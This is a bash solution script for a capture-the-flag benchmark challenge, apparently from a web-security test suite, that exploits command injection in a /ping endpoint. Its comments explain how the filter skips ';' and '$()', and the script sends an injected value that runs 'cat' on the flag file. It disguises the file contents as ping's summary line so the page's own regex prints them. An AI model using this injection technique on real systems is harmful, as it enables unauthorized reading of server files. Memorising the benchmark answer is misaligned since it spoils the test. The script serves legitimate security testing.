#!/usr/bin/env bash
# XBEN-045-24 — "Is There Anybody Out There?" (tags: command_injection)
#
# `/ping` concatenates the address into `ping -c 2 <ip>` and runs it through a
# shell, rejecting `<`, `>`, `|` and `&`. It does not reject `;`, `$`, `(` or
# `)`.
#
# The command's output is not shown either: a regex pulls three numbers out of
# ping's summary line and the page renders those. But a regex reading a line the
# injected command gets to write is a channel, not a filter — print a summary
# line of your own with the flag where the transmitted count goes, and the
# application formats it into the page itself.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben045-$$"
FILE="${2:-/FLAG.txt}"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/ping' \
    --set "form.ip_address=;echo \"\$(cat $FILE) packets transmitted, 1 received, 0% packet loss\";#" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
